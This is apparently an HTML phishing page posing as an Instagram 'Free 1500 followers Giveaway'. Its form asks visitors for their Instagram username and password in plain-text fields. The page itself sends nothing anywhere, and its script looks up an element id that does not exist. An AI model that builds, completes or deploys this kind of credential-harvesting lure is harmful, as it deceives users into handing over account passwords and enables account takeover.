<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 1500 followers Giveaway</title>
    <style>
        body {
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
            animation: backgroundFade 3s infinite alternate;
        }
        @keyframes backgroundFade {
            from { background: linear-gradient(135deg, #6a11cb, #2575fc); }
            to { background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045); }
        }
        .giveaway-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            width: 400px;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #6a11cb;
        }
        .input-box {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #6a11cb;
            border-radius: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.7);
        }
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: #6a11cb;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
        }
        .submit-btn:hover {
            background: #833ab4;
        }
    </style>
    <script>
        function checkCode() {
            let box1 = document.getElementById("instagram username").value;
            let box2 = document.getElementById("password").value;

            if (box1.trim() !== "" && box2.trim() !== "") {
                alert("You will get an alert in your instagram app!");
            }
        }
    </script>
</head>
<body>
    <div class="giveaway-container">
        <h1>Free 1500 followers Giveaway</h1>
        <input type="text" id="username" class="input-box" placeholder="instagram username" required>
        <input type="text" id="password" class="input-box" placeholder="password" required>
        <button class="submit-btn" onclick="checkCode()">Submit</button>
    </div>
</body>
</html>
